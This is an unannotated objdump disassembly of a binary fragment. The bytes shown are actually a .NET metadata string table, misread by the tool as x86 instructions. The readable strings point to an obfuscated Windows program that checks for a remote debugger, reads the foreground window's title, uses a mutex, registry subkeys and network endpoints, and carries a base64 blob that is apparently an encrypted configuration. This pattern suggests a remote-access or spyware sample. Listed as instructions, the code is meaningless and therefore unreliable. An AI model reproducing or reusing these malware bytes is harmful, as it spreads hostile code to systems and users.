  409a8e:	6d                   	insl   (%dx),%es:(%edi)
  409a8f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a91:	74 00                	je     0x409a93
  409a93:	53                   	push   %ebx
  409a94:	79 73                	jns    0x409b09
  409a96:	74 65                	je     0x409afd
  409a98:	6d                   	insl   (%dx),%es:(%edi)
  409a99:	2e 43                	cs inc %ebx
  409a9b:	6f                   	outsl  %ds:(%esi),(%dx)
  409a9c:	6c                   	insb   (%dx),%es:(%edi)
  409a9d:	6c                   	insb   (%dx),%es:(%edi)
  409a9e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409aa3:	6e                   	outsb  %ds:(%esi),(%dx)
  409aa4:	73 2e                	jae    0x409ad4
  409aa6:	49                   	dec    %ecx
  409aa7:	45                   	inc    %ebp
  409aa8:	6e                   	outsb  %ds:(%esi),(%dx)
  409aa9:	75 6d                	jne    0x409b18
  409aab:	65 72 61             	gs jb  0x409b0f
  409aae:	74 6f                	je     0x409b1f
  409ab0:	72 2e                	jb     0x409ae0
  409ab2:	67 65 74 5f          	addr16 gs je 0x409b15
  409ab6:	43                   	inc    %ebx
  409ab7:	75 72                	jne    0x409b2b
  409ab9:	72 65                	jb     0x409b20
  409abb:	6e                   	outsb  %ds:(%esi),(%dx)
  409abc:	74 00                	je     0x409abe
  409abe:	47                   	inc    %edi
  409abf:	65 74 43             	gs je  0x409b05
  409ac2:	75 72                	jne    0x409b36
  409ac4:	72 65                	jb     0x409b2b
  409ac6:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac7:	74 00                	je     0x409ac9
  409ac9:	43                   	inc    %ebx
  409aca:	68 65 63 6b 52       	push   $0x526b6365
  409acf:	65 6d                	gs insl (%dx),%es:(%edi)
  409ad1:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad2:	74 65                	je     0x409b39
  409ad4:	44                   	inc    %esp
  409ad5:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409ad9:	67 65 72 50          	addr16 gs jb 0x409b2d
  409add:	72 65                	jb     0x409b44
  409adf:	73 65                	jae    0x409b46
  409ae1:	6e                   	outsb  %ds:(%esi),(%dx)
  409ae2:	74 00                	je     0x409ae4
  409ae4:	67 65 74 5f          	addr16 gs je 0x409b47
  409ae8:	52                   	push   %edx
  409ae9:	65 6d                	gs insl (%dx),%es:(%edi)
  409aeb:	6f                   	outsl  %ds:(%esi),(%dx)
  409aec:	74 65                	je     0x409b53
  409aee:	45                   	inc    %ebp
  409aef:	6e                   	outsb  %ds:(%esi),(%dx)
  409af0:	64 50                	fs push %eax
  409af2:	6f                   	outsl  %ds:(%esi),(%dx)
  409af3:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409afa:	5f                   	pop    %edi
  409afb:	43                   	inc    %ebx
  409afc:	6f                   	outsl  %ds:(%esi),(%dx)
  409afd:	75 6e                	jne    0x409b6d
  409aff:	74 00                	je     0x409b01
  409b01:	67 65 74 5f          	addr16 gs je 0x409b64
  409b05:	50                   	push   %eax
  409b06:	72 6f                	jb     0x409b77
  409b08:	63 65 73             	arpl   %esp,0x73(%ebp)
  409b0b:	73 6f                	jae    0x409b7c
  409b0d:	72 43                	jb     0x409b52
  409b0f:	6f                   	outsl  %ds:(%esi),(%dx)
  409b10:	75 6e                	jne    0x409b80
  409b12:	74 00                	je     0x409b14
  409b14:	47                   	inc    %edi
  409b15:	65 74 50             	gs je  0x409b68
  409b18:	61                   	popa
  409b19:	74 68                	je     0x409b83
  409b1b:	52                   	push   %edx
  409b1c:	6f                   	outsl  %ds:(%esi),(%dx)
  409b1d:	6f                   	outsl  %ds:(%esi),(%dx)
  409b1e:	74 00                	je     0x409b20
  409b20:	66 42                	inc    %dx
  409b22:	4c                   	dec    %esp
  409b23:	59                   	pop    %ecx
  409b24:	65 71 4d             	gs jno 0x409b74
  409b27:	68 4e 43 64 70       	push   $0x7064434e
  409b2c:	74 00                	je     0x409b2e
  409b2e:	4e                   	dec    %esi
  409b2f:	74 52                	je     0x409b83
  409b31:	57                   	push   %edi
  409b32:	6c                   	insb   (%dx),%es:(%edi)
  409b33:	52                   	push   %edx
  409b34:	51                   	push   %ecx
  409b35:	4a                   	dec    %edx
  409b36:	6e                   	outsb  %ds:(%esi),(%dx)
  409b37:	4d                   	dec    %ebp
  409b38:	71 74                	jno    0x409bae
  409b3a:	00 50 61             	add    %dl,0x61(%eax)
  409b3d:	72 61                	jb     0x409ba0
  409b3f:	6d                   	insl   (%dx),%es:(%edi)
  409b40:	65 74 65             	gs je  0x409ba8
  409b43:	72 69                	jb     0x409bae
  409b45:	7a 65                	jp     0x409bac
  409b47:	64 54                	fs push %esp
  409b49:	68 72 65 61 64       	push   $0x64616572
  409b4e:	53                   	push   %ebx
  409b4f:	74 61                	je     0x409bb2
  409b51:	72 74                	jb     0x409bc7
  409b53:	00 43 6f             	add    %al,0x6f(%ebx)
  409b56:	6e                   	outsb  %ds:(%esi),(%dx)
  409b57:	76 65                	jbe    0x409bbe
  409b59:	72 74                	jb     0x409bcf
  409b5b:	00 46 61             	add    %al,0x61(%esi)
  409b5e:	69 6c 46 61 73 74 00 	imul   $0x59007473,0x61(%esi,%eax,2),%ebp
  409b65:	59 
  409b66:	72 79                	jb     0x409be1
  409b68:	6c                   	insb   (%dx),%es:(%edi)
  409b69:	59                   	pop    %ecx
  409b6a:	61                   	popa
  409b6b:	44                   	inc    %esp
  409b6c:	62 77 68             	bound  %esi,0x68(%edi)
  409b6f:	70 62                	jo     0x409bd3
  409b71:	73 74                	jae    0x409be7
  409b73:	00 54 6f 4c          	add    %dl,0x4c(%edi,%ebp,2)
  409b77:	69 73 74 00 59 44 67 	imul   $0x67445900,0x74(%ebx),%esi
  409b7e:	5a                   	pop    %edx
  409b7f:	50                   	push   %eax
  409b80:	46                   	inc    %esi
  409b81:	48                   	dec    %eax
  409b82:	63 77 74             	arpl   %esi,0x74(%edi)
  409b85:	00 53 79             	add    %dl,0x79(%ebx)
  409b88:	73 74                	jae    0x409bfe
  409b8a:	65 6d                	gs insl (%dx),%es:(%edi)
  409b8c:	2e 43                	cs inc %ebx
  409b8e:	6f                   	outsl  %ds:(%esi),(%dx)
  409b8f:	6c                   	insb   (%dx),%es:(%edi)
  409b90:	6c                   	insb   (%dx),%es:(%edi)
  409b91:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409b96:	6e                   	outsb  %ds:(%esi),(%dx)
  409b97:	73 2e                	jae    0x409bc7
  409b99:	49                   	dec    %ecx
  409b9a:	45                   	inc    %ebp
  409b9b:	6e                   	outsb  %ds:(%esi),(%dx)
  409b9c:	75 6d                	jne    0x409c0b
  409b9e:	65 72 61             	gs jb  0x409c02
  409ba1:	74 6f                	je     0x409c12
  409ba3:	72 2e                	jb     0x409bd3
  409ba5:	4d                   	dec    %ebp
  409ba6:	6f                   	outsl  %ds:(%esi),(%dx)
  409ba7:	76 65                	jbe    0x409c0e
  409ba9:	4e                   	dec    %esi
  409baa:	65 78 74             	gs js  0x409c21
  409bad:	00 53 79             	add    %dl,0x79(%ebx)
  409bb0:	73 74                	jae    0x409c26
  409bb2:	65 6d                	gs insl (%dx),%es:(%edi)
  409bb4:	2e 54                	cs push %esp
  409bb6:	65 78 74             	gs js  0x409c2d
  409bb9:	00 47 65             	add    %al,0x65(%edi)
  409bbc:	74 57                	je     0x409c15
  409bbe:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409bc5:	78 74                	js     0x409c3b
  409bc7:	00 50 67             	add    %dl,0x67(%eax)
  409bca:	6e                   	outsb  %ds:(%esi),(%dx)
  409bcb:	50                   	push   %eax
  409bcc:	70 78                	jo     0x409c46
  409bce:	69 55 6d 7a 42 75 00 	imul   $0x75427a,0x6d(%ebp),%edx
  409bd5:	68 68 48 5a 43       	push   $0x435a4868
  409bda:	6c                   	insb   (%dx),%es:(%edi)
  409bdb:	46                   	inc    %esi
  409bdc:	52                   	push   %edx
  409bdd:	66 79 45             	data16 jns 0x409c25
  409be0:	4d                   	dec    %ebp
  409be1:	75 00                	jne    0x409be3
  409be3:	4b                   	dec    %ebx
  409be4:	41                   	inc    %ecx
  409be5:	48                   	dec    %eax
  409be6:	61                   	popa
  409be7:	4a                   	dec    %edx
  409be8:	44                   	inc    %esp
  409be9:	4b                   	dec    %ebx
  409bea:	51                   	push   %ecx
  409beb:	52                   	push   %edx
  409bec:	51                   	push   %ecx
  409bed:	75 74                	jne    0x409c63
  409bef:	56                   	push   %esi
  409bf0:	75 00                	jne    0x409bf2
  409bf2:	49                   	dec    %ecx
  409bf3:	56                   	push   %esi
  409bf4:	58                   	pop    %eax
  409bf5:	61                   	popa
  409bf6:	65 71 78             	gs jno 0x409c71
  409bf9:	67 78 42             	addr16 js 0x409c3e
  409bfc:	77 66                	ja     0x409c64
  409bfe:	75 00                	jne    0x409c00
  409c00:	7a 46                	jp     0x409c48
  409c02:	41                   	inc    %ecx
  409c03:	6a 67                	push   $0x67
  409c05:	42                   	inc    %edx
  409c06:	4d                   	dec    %ebp
  409c07:	6e                   	outsb  %ds:(%esi),(%dx)
  409c08:	76 51                	jbe    0x409c5b
  409c0a:	69 75 00 66 75 4e 67 	imul   $0x674e7566,0x0(%ebp),%esi
  409c11:	79 4c                	jns    0x409c5f
  409c13:	6c                   	insb   (%dx),%es:(%edi)
  409c14:	65 71 75             	gs jno 0x409c8c
  409c17:	00 65 59             	add    %ah,0x59(%ebp)
  409c1a:	4c                   	dec    %esp
  409c1b:	4d                   	dec    %ebp
  409c1c:	4d                   	dec    %ebp
  409c1d:	7a 51                	jp     0x409c70
  409c1f:	42                   	inc    %edx
  409c20:	69 65 45 76 00 42 45 	imul   $0x45420076,0x45(%ebp),%esp
  409c27:	41                   	inc    %ecx
  409c28:	5a                   	pop    %edx
  409c29:	46                   	inc    %esi
  409c2a:	56                   	push   %esi
  409c2b:	63 76 71             	arpl   %esi,0x71(%esi)
  409c2e:	51                   	push   %ecx
  409c2f:	76 00                	jbe    0x409c31
  409c31:	6b 46 47 64          	imul   $0x64,0x47(%esi),%eax
  409c35:	71 71                	jno    0x409ca8
  409c37:	73 41                	jae    0x409c7a
  409c39:	53                   	push   %ebx
  409c3a:	55                   	push   %ebp
  409c3b:	76 00                	jbe    0x409c3d
  409c3d:	43                   	inc    %ebx
  409c3e:	73 7a                	jae    0x409cba
  409c40:	67 46                	addr16 inc %esi
  409c42:	42                   	inc    %edx
  409c43:	45                   	inc    %ebp
  409c44:	6c                   	insb   (%dx),%es:(%edi)
  409c45:	68 48 51 5a 76       	push   $0x765a5148
  409c4a:	00 6e 41             	add    %ch,0x41(%esi)
  409c4d:	50                   	push   %eax
  409c4e:	77 45                	ja     0x409c95
  409c50:	63 46 76             	arpl   %eax,0x76(%esi)
  409c53:	65 6a 76             	gs push $0x76
  409c56:	00 4e 51             	add    %cl,0x51(%esi)
  409c59:	50                   	push   %eax
  409c5a:	4a                   	dec    %edx
  409c5b:	6f                   	outsl  %ds:(%esi),(%dx)
  409c5c:	7a 73                	jp     0x409cd1
  409c5e:	54                   	push   %esp
  409c5f:	54                   	push   %esp
  409c60:	6a 58                	push   $0x58
  409c62:	42                   	inc    %edx
  409c63:	71 76                	jno    0x409cdb
  409c65:	00 4f 70             	add    %cl,0x70(%edi)
  409c68:	68 65 49 51 4c       	push   $0x4c514965
  409c6d:	72 75                	jb     0x409ce4
  409c6f:	62 55 4f             	bound  %edx,0x4f(%ebp)
  409c72:	4f                   	dec    %edi
  409c73:	77 00                	ja     0x409c75
  409c75:	75 6e                	jne    0x409ce5
  409c77:	44                   	inc    %esp
  409c78:	4f                   	dec    %edi
  409c79:	56                   	push   %esi
  409c7a:	59                   	pop    %ecx
  409c7b:	4e                   	dec    %esi
  409c7c:	55                   	push   %ebp
  409c7d:	49                   	dec    %ecx
  409c7e:	5a                   	pop    %edx
  409c7f:	77 00                	ja     0x409c81
  409c81:	44                   	inc    %esp
  409c82:	46                   	inc    %esi
  409c83:	56                   	push   %esi
  409c84:	6e                   	outsb  %ds:(%esi),(%dx)
  409c85:	44                   	inc    %esp
  409c86:	77 65                	ja     0x409ced
  409c88:	6b 4f 4b 74          	imul   $0x74,0x4b(%edi),%ecx
  409c8c:	61                   	popa
  409c8d:	57                   	push   %edi
  409c8e:	65 77 00             	gs ja  0x409c91
  409c91:	63 6d 6a             	arpl   %ebp,0x6a(%ebp)
  409c94:	57                   	push   %edi
  409c95:	6c                   	insb   (%dx),%es:(%edi)
  409c96:	42                   	inc    %edx
  409c97:	5a                   	pop    %edx
  409c98:	71 63                	jno    0x409cfd
  409c9a:	43                   	inc    %ebx
  409c9b:	51                   	push   %ecx
  409c9c:	68 77 00 50 76       	push   $0x76500077
  409ca1:	6b 4d 65 42          	imul   $0x42,0x65(%ebp),%ecx
  409ca5:	78 61                	js     0x409d08
  409ca7:	42                   	inc    %edx
  409ca8:	42                   	inc    %edx
  409ca9:	56                   	push   %esi
  409caa:	4c                   	dec    %esp
  409cab:	6f                   	outsl  %ds:(%esi),(%dx)
  409cac:	77 00                	ja     0x409cae
  409cae:	47                   	inc    %edi
  409caf:	65 74 46             	gs je  0x409cf8
  409cb2:	6f                   	outsl  %ds:(%esi),(%dx)
  409cb3:	72 65                	jb     0x409d1a
  409cb5:	67 72 6f             	addr16 jb 0x409d27
  409cb8:	75 6e                	jne    0x409d28
  409cba:	64 57                	fs push %edi
  409cbc:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409cc3:	65 74 5f             	gs je  0x409d25
  409cc6:	43                   	inc    %ebx
  409cc7:	72 65                	jb     0x409d2e
  409cc9:	61                   	popa
  409cca:	74 65                	je     0x409d31
  409ccc:	4e                   	dec    %esi
  409ccd:	6f                   	outsl  %ds:(%esi),(%dx)
  409cce:	57                   	push   %edi
  409ccf:	69 6e 64 6f 77 00 6a 	imul   $0x6a00776f,0x64(%esi),%ebp
  409cd6:	46                   	inc    %esi
  409cd7:	7a 67                	jp     0x409d40
  409cd9:	73 6d                	jae    0x409d48
  409cdb:	5a                   	pop    %edx
  409cdc:	49                   	dec    %ecx
  409cdd:	4f                   	dec    %edi
  409cde:	78 00                	js     0x409ce0
  409ce0:	45                   	inc    %ebp
  409ce1:	43                   	inc    %ebx
  409ce2:	78 73                	js     0x409d57
  409ce4:	41                   	inc    %ecx
  409ce5:	64 47                	fs inc %edi
  409ce7:	52                   	push   %edx
  409ce8:	72 71                	jb     0x409d5b
  409cea:	53                   	push   %ebx
  409ceb:	78 00                	js     0x409ced
  409ced:	59                   	pop    %ecx
  409cee:	43                   	inc    %ebx
  409cef:	78 77                	js     0x409d68
  409cf1:	41                   	inc    %ecx
  409cf2:	49                   	dec    %ecx
  409cf3:	6e                   	outsb  %ds:(%esi),(%dx)
  409cf4:	43                   	inc    %ebx
  409cf5:	79 4b                	jns    0x409d42
  409cf7:	44                   	inc    %esp
  409cf8:	4f                   	dec    %edi
  409cf9:	4f                   	dec    %edi
  409cfa:	65 78 00             	gs js  0x409cfd
  409cfd:	4d                   	dec    %ebp
  409cfe:	75 74                	jne    0x409d74
  409d00:	65 78 00             	gs js  0x409d03
  409d03:	4f                   	dec    %edi
  409d04:	47                   	inc    %edi
  409d05:	41                   	inc    %ecx
  409d06:	56                   	push   %esi
  409d07:	6e                   	outsb  %ds:(%esi),(%dx)
  409d08:	51                   	push   %ecx
  409d09:	5a                   	pop    %edx
  409d0a:	66 74 6a             	data16 je 0x409d77
  409d0d:	68 78 00 47 4b       	push   $0x4b470078
  409d12:	70 45                	jo     0x409d59
  409d14:	72 49                	jb     0x409d5f
  409d16:	6e                   	outsb  %ds:(%esi),(%dx)
  409d17:	4a                   	dec    %edx
  409d18:	63 6f 48             	arpl   %ebp,0x48(%edi)
  409d1b:	75 78                	jne    0x409d95
  409d1d:	00 6d 48             	add    %ch,0x48(%ebp)
  409d20:	54                   	push   %esp
  409d21:	49                   	dec    %ecx
  409d22:	70 74                	jo     0x409d98
  409d24:	68 49 69 74 41       	push   $0x41746949
  409d29:	78 78                	js     0x409da3
  409d2b:	00 6d 42             	add    %ch,0x42(%ebp)
  409d2e:	61                   	popa
  409d2f:	4d                   	dec    %ebp
  409d30:	62 52 77             	bound  %edx,0x77(%edx)
  409d33:	48                   	dec    %eax
  409d34:	49                   	dec    %ecx
  409d35:	46                   	inc    %esi
  409d36:	65 69 79 78 00 57 56 	imul   $0x56565700,%gs:0x78(%ecx),%edi
  409d3d:	56 
  409d3e:	53                   	push   %ebx
  409d3f:	52                   	push   %edx
  409d40:	4a                   	dec    %edx
  409d41:	58                   	pop    %eax
  409d42:	58                   	pop    %eax
  409d43:	71 45                	jno    0x409d8a
  409d45:	79 00                	jns    0x409d47
  409d47:	62 58 4a             	bound  %ebx,0x4a(%eax)
  409d4a:	79 4d                	jns    0x409d99
  409d4c:	62 76 64             	bound  %esi,0x64(%esi)
  409d4f:	58                   	pop    %eax
  409d50:	48                   	dec    %eax
  409d51:	47                   	inc    %edi
  409d52:	79 00                	jns    0x409d54
  409d54:	61                   	popa
  409d55:	4b                   	dec    %ebx
  409d56:	5a                   	pop    %edx
  409d57:	48                   	dec    %eax
  409d58:	44                   	inc    %esp
  409d59:	48                   	dec    %eax
  409d5a:	72 4f                	jb     0x409dab
  409d5c:	5a                   	pop    %edx
  409d5d:	4a                   	dec    %edx
  409d5e:	5a                   	pop    %edx
  409d5f:	45                   	inc    %ebp
  409d60:	59                   	pop    %ecx
  409d61:	48                   	dec    %eax
  409d62:	79 00                	jns    0x409d64
  409d64:	68 43 6f 6e 4f       	push   $0x4f6e6f43
  409d69:	52                   	push   %edx
  409d6a:	4a                   	dec    %edx
  409d6b:	7a 74                	jp     0x409de1
  409d6d:	54                   	push   %esp
  409d6e:	58                   	pop    %eax
  409d6f:	74 58                	je     0x409dc9
  409d71:	79 00                	jns    0x409d73
  409d73:	49                   	dec    %ecx
  409d74:	6e                   	outsb  %ds:(%esi),(%dx)
  409d75:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409d7c:	65 
  409d7d:	41                   	inc    %ecx
  409d7e:	72 72                	jb     0x409df2
  409d80:	61                   	popa
  409d81:	79 00                	jns    0x409d83
  409d83:	54                   	push   %esp
  409d84:	6f                   	outsl  %ds:(%esi),(%dx)
  409d85:	41                   	inc    %ecx
  409d86:	72 72                	jb     0x409dfa
  409d88:	61                   	popa
  409d89:	79 00                	jns    0x409d8b
  409d8b:	67 65 74 5f          	addr16 gs je 0x409dee
  409d8f:	41                   	inc    %ecx
  409d90:	73 41                	jae    0x409dd3
  409d92:	72 72                	jb     0x409e06
  409d94:	61                   	popa
  409d95:	79 00                	jns    0x409d97
  409d97:	67 65 74 5f          	addr16 gs je 0x409dfa
  409d9b:	4b                   	dec    %ebx
  409d9c:	65 79 00             	gs jns 0x409d9f
  409d9f:	73 65                	jae    0x409e06
  409da1:	74 5f                	je     0x409e02
  409da3:	4b                   	dec    %ebx
  409da4:	65 79 00             	gs jns 0x409da7
  409da7:	43                   	inc    %ebx
  409da8:	72 65                	jb     0x409e0f
  409daa:	61                   	popa
  409dab:	74 65                	je     0x409e12
  409dad:	53                   	push   %ebx
  409dae:	75 62                	jne    0x409e12
  409db0:	4b                   	dec    %ebx
  409db1:	65 79 00             	gs jns 0x409db4
  409db4:	4f                   	dec    %edi
  409db5:	70 65                	jo     0x409e1c
  409db7:	6e                   	outsb  %ds:(%esi),(%dx)
  409db8:	53                   	push   %ebx
  409db9:	75 62                	jne    0x409e1d
  409dbb:	4b                   	dec    %ebx
  409dbc:	65 79 00             	gs jns 0x409dbf
  409dbf:	67 65 74 5f          	addr16 gs je 0x409e22
  409dc3:	50                   	push   %eax
  409dc4:	75 62                	jne    0x409e28
  409dc6:	6c                   	insb   (%dx),%es:(%edi)
  409dc7:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409dce:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409dd5:	4b 65 
  409dd7:	79 00                	jns    0x409dd9
  409dd9:	70 48                	jo     0x409e23
  409ddb:	49                   	dec    %ecx
  409ddc:	4f                   	dec    %edi
  409ddd:	46                   	inc    %esi
  409dde:	55                   	push   %ebp
  409ddf:	6f                   	outsl  %ds:(%esi),(%dx)
  409de0:	59                   	pop    %ecx
  409de1:	65 79 00             	gs jns 0x409de4
  409de4:	42                   	inc    %edx
  409de5:	45                   	inc    %ebp
  409de6:	4c                   	dec    %esp
  409de7:	55                   	push   %ebp
  409de8:	53                   	push   %ebx
  409de9:	6f                   	outsl  %ds:(%esi),(%dx)
  409dea:	61                   	popa
  409deb:	4f                   	dec    %edi
  409dec:	6b 76 47 46          	imul   $0x46,0x47(%esi),%esi
  409df0:	48                   	dec    %eax
  409df1:	68 79 00 53 79       	push   $0x79530079
  409df6:	73 74                	jae    0x409e6c
  409df8:	65 6d                	gs insl (%dx),%es:(%edi)
  409dfa:	2e 53                	cs push %ebx
  409dfc:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e00:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409e07:	70 
  409e08:	74 6f                	je     0x409e79
  409e0a:	67 72 61             	addr16 jb 0x409e6e
  409e0d:	70 68                	jo     0x409e77
  409e0f:	79 00                	jns    0x409e11
  409e11:	41                   	inc    %ecx
  409e12:	73 73                	jae    0x409e87
  409e14:	65 6d                	gs insl (%dx),%es:(%edi)
  409e16:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409e1a:	41                   	inc    %ecx
  409e1b:	64 64 72 65          	fs fs jb 0x409e84
  409e1f:	73 73                	jae    0x409e94
  409e21:	46                   	inc    %esi
  409e22:	61                   	popa
  409e23:	6d                   	insl   (%dx),%es:(%edi)
  409e24:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409e2b:	63 
  409e2c:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409e30:	79 00                	jns    0x409e32
  409e32:	54                   	push   %esp
  409e33:	6f                   	outsl  %ds:(%esi),(%dx)
  409e34:	42                   	inc    %edx
  409e35:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e3c:	65 74 5f             	gs je  0x409e9e
  409e3f:	53                   	push   %ebx
  409e40:	79 73                	jns    0x409eb5
  409e42:	74 65                	je     0x409ea9
  409e44:	6d                   	insl   (%dx),%es:(%edi)
  409e45:	44                   	inc    %esp
  409e46:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e4d:	79 00                	jns    0x409e4f
  409e4f:	52                   	push   %edx
  409e50:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409e57:	00 6f 
  409e59:	70 5f                	jo     0x409eba
  409e5b:	45                   	inc    %ebp
  409e5c:	71 75                	jno    0x409ed3
  409e5e:	61                   	popa
  409e5f:	6c                   	insb   (%dx),%es:(%edi)
  409e60:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409e67:	49 
  409e68:	6e                   	outsb  %ds:(%esi),(%dx)
  409e69:	65 71 75             	gs jno 0x409ee1
  409e6c:	61                   	popa
  409e6d:	6c                   	insb   (%dx),%es:(%edi)
  409e6e:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409e75:	74 
  409e76:	65 6d                	gs insl (%dx),%es:(%edi)
  409e78:	2e 4e                	cs dec %esi
  409e7a:	65 74 2e             	gs je  0x409eab
  409e7d:	53                   	push   %ebx
  409e7e:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e82:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409e89:	64 
  409e8a:	6f                   	outsl  %ds:(%esi),(%dx)
  409e8b:	77 73                	ja     0x409f00
  409e8d:	49                   	dec    %ecx
  409e8e:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409e91:	74 69                	je     0x409efc
  409e93:	74 79                	je     0x409f0e
  409e95:	00 49 73             	add    %cl,0x73(%ecx)
  409e98:	4e                   	dec    %esi
  409e99:	75 6c                	jne    0x409f07
  409e9b:	6c                   	insb   (%dx),%es:(%edi)
  409e9c:	4f                   	dec    %edi
  409e9d:	72 45                	jb     0x409ee4
  409e9f:	6d                   	insl   (%dx),%es:(%edi)
  409ea0:	70 74                	jo     0x409f16
  409ea2:	79 00                	jns    0x409ea4
  409ea4:	55                   	push   %ebp
  409ea5:	6a 66                	push   $0x66
  409ea7:	52                   	push   %edx
  409ea8:	59                   	pop    %ecx
  409ea9:	4a                   	dec    %edx
  409eaa:	74 4e                	je     0x409efa
  409eac:	51                   	push   %ecx
  409ead:	57                   	push   %edi
  409eae:	7a 79                	jp     0x409f29
  409eb0:	00 46 59             	add    %al,0x59(%esi)
  409eb3:	71 78                	jno    0x409f2d
  409eb5:	61                   	popa
  409eb6:	51                   	push   %ecx
  409eb7:	46                   	inc    %esi
  409eb8:	71 69                	jno    0x409f23
  409eba:	59                   	pop    %ecx
  409ebb:	41                   	inc    %ecx
  409ebc:	79 6e                	jns    0x409f2c
  409ebe:	62 7a 00             	bound  %edi,0x0(%edx)
  409ec1:	5a                   	pop    %edx
  409ec2:	73 47                	jae    0x409f0b
  409ec4:	42                   	inc    %edx
  409ec5:	6d                   	insl   (%dx),%es:(%edi)
  409ec6:	50                   	push   %eax
  409ec7:	46                   	inc    %esi
  409ec8:	6f                   	outsl  %ds:(%esi),(%dx)
  409ec9:	73 46                	jae    0x409f11
  409ecb:	73 65                	jae    0x409f32
  409ecd:	7a 00                	jp     0x409ecf
  409ecf:	46                   	inc    %esi
  409ed0:	6c                   	insb   (%dx),%es:(%edi)
  409ed1:	7a 58                	jp     0x409f2b
  409ed3:	61                   	popa
  409ed4:	4a                   	dec    %edx
  409ed5:	45                   	inc    %ebp
  409ed6:	62 4e 6d             	bound  %ecx,0x6d(%esi)
  409ed9:	7a 00                	jp     0x409edb
  409edb:	69 77 6d 63 73 7a 44 	imul   $0x447a7363,0x6d(%edi),%esi
  409ee2:	68 61 72 66 42       	push   $0x42667261
  409ee7:	52                   	push   %edx
  409ee8:	69 79 7a 00 69 49 74 	imul   $0x74496900,0x7a(%ecx),%edi
  409eef:	4e                   	dec    %esi
  409ef0:	7a 6d                	jp     0x409f5f
  409ef2:	42                   	inc    %edx
  409ef3:	5a                   	pop    %edx
  409ef4:	47                   	inc    %edi
  409ef5:	6a 43                	push   $0x43
  409ef7:	54                   	push   %esp
  409ef8:	62 42 57             	bound  %eax,0x57(%edx)
  409efb:	7a 7a                	jp     0x409f77
  409efd:	00 00                	add    %al,(%eax)
  409eff:	00 00                	add    %al,(%eax)
  409f01:	0d 53 00 48 00       	or     $0x480053,%eax
  409f06:	41                   	inc    %ecx
  409f07:	00 32                	add    %dh,(%edx)
  409f09:	00 35 00 36 00 00    	add    %dh,0x3600
  409f0f:	80 d9 61             	sbb    $0x61,%cl
  409f12:	00 47 00             	add    %al,0x0(%edi)
  409f15:	67 00 30             	add    %dh,(%bx,%si)
  409f18:	00 78 00             	add    %bh,0x0(%eax)
  409f1b:	6c                   	insb   (%dx),%es:(%edi)
  409f1c:	00 46 00             	add    %al,0x0(%esi)
  409f1f:	2b 00                	sub    (%eax),%eax
  409f21:	47                   	inc    %edi
  409f22:	00 38                	add    %bh,(%eax)
  409f24:	00 50 00             	add    %dl,0x0(%eax)
  409f27:	6b 00 54             	imul   $0x54,(%eax),%eax
  409f2a:	00 57 00             	add    %dl,0x0(%edi)
  409f2d:	6b 00 53             	imul   $0x53,(%eax),%eax
  409f30:	00 53 00             	add    %dl,0x0(%ebx)
  409f33:	38 00                	cmp    %al,(%eax)
  409f35:	59                   	pop    %ecx
  409f36:	00 4e 00             	add    %cl,0x0(%esi)
  409f39:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  409f3d:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  409f41:	66 00 37             	data16 add %dh,(%edi)
  409f44:	00 57 00             	add    %dl,0x0(%edi)
  409f47:	42                   	inc    %edx
  409f48:	00 32                	add    %dh,(%edx)
  409f4a:	00 7a 00             	add    %bh,0x0(%edx)
  409f4d:	50                   	push   %eax
  409f4e:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  409f52:	00 2f                	add    %ch,(%edi)
  409f54:	00 58 00             	add    %bl,0x0(%eax)
  409f57:	32 00                	xor    (%eax),%al
  409f59:	70 00                	jo     0x409f5b
  409f5b:	35 00 6c 00 61       	xor    $0x61006c00,%eax
  409f60:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  409f64:	00 6a 00             	add    %ch,0x0(%edx)
  409f67:	45                   	inc    %ebp
  409f68:	00 2b                	add    %ch,(%ebx)
  409f6a:	00 4b 00             	add    %cl,0x0(%ebx)
  409f6d:	4b                   	dec    %ebx
  409f6e:	00 55 00             	add    %dl,0x0(%ebp)
  409f71:	45                   	inc    %ebp
  409f72:	00 4f 00             	add    %cl,0x0(%edi)
  409f75:	74 00                	je     0x409f77
  409f77:	59                   	pop    %ecx
  409f78:	00 55 00             	add    %dl,0x0(%ebp)
  409f7b:	35 00 49 00 2f       	xor    $0x2f004900,%eax
  409f80:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  409f84:	00 57 00             	add    %dl,0x0(%edi)
  409f87:	4c                   	dec    %esp
  409f88:	00 4e 00             	add    %cl,0x0(%esi)
  409f8b:	75 00                	jne    0x409f8d
